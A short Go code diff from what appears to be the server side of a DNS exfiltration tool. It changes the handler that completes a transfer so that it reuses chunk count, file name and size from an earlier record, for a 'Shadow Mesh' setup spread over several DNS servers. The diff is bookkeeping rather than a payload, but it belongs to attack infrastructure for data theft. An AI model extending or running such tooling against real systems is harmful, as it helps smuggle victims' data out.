@@ -2046,10 +2046,25 @@ func (api *APIServer) handleExfilCompleteByTag(w http.ResponseWriter, r *http.Re
 		return
 	}
 
+	// Look up existing transfer to get TotalChunks if we don't have it in the request
+	// This handles Shadow Mesh where metadata went to a different DNS server than completion
+	existingTransfer, _ := api.db.GetExfilTransfer(sessionID)
+	totalChunks := 0
+	var fileName string
+	var fileSize int64
+	if existingTransfer != nil {
+		totalChunks = existingTransfer.TotalChunks
+		fileName = existingTransfer.FileName
+		fileSize = existingTransfer.FileSize
+	}
+
 	// Mark as complete (trigger assembly check)
 	transfer, err := api.db.MarkExfilTransferComplete(&ExfilCompletionRecord{
-		SessionID: sessionID,
-		SourceDNS: dnsServerID,
+		SessionID:   sessionID,
+		SourceDNS:   dnsServerID,
+		TotalChunks: totalChunks,
+		FileName:    fileName,
+		FileSize:    fileSize,
 	})
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to finalize exfil transfer: %v", err))
